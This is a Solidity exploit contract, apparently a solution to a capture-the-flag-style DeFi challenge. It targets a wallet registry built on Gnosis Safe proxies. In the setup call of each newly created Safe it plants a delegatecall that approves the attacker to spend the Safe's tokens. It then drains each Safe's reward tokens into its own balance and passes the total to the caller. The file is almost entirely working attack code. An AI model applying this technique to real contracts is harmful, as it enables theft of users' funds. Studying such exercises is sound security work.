// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";

contract BackdoorAttacker {
    WalletRegistry walletRegistry;
    GnosisSafeProxyFactory proxyFactory;
    IERC20 token;

    address public masterCopy;

    constructor(address _walletRegistry,  address _proxyFactory, address _masterCopy, address _token) {
        walletRegistry = WalletRegistry(_walletRegistry);
        proxyFactory = GnosisSafeProxyFactory(_proxyFactory);
        token = IERC20(_token);
        
        masterCopy = _masterCopy;
    }

    function delegateApprove(address _safe, address _token) external {
        IERC20(_token).approve(_safe, 10 ether);
    }

    function attack(address[] memory _beneficiaries) external {
        for (uint256 i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            console.log("Creating Safe for %s", beneficiary[0]);

            bytes memory data = abi.encodeWithSelector(
                BackdoorAttacker.delegateApprove.selector,
                address(this),
                address(token)
            );

            bytes memory setupData = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                beneficiary,
                1,
                address(this),
                data,
                address(0),
                0,
                0,
                0
            );

            console.log("Wallet registry: %s", address(walletRegistry));
            console.log("Proxy factory: %s", address(proxyFactory));
            console.log("Master copy: %s", masterCopy);
            console.log("Setup data created");

            address proxy = address(proxyFactory.createProxyWithCallback(
                masterCopy,
                setupData,
                0,
                IProxyCreationCallback(address(walletRegistry))
            ));

            console.log("Safe created : ", proxy);

            console.log("Attack start");

            console.log("Wallet Registry Token Balance: %s", token.balanceOf(address(proxy)));
            console.log("Allowance for Attacker: %s", token.allowance(address(proxy), address(this)));

            token.transferFrom(address(proxy), address(this), 10 ether);

            console.log("Attacker Contract Balance: %s", token.balanceOf(address(this)));
        }

        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    receive() external payable {}
}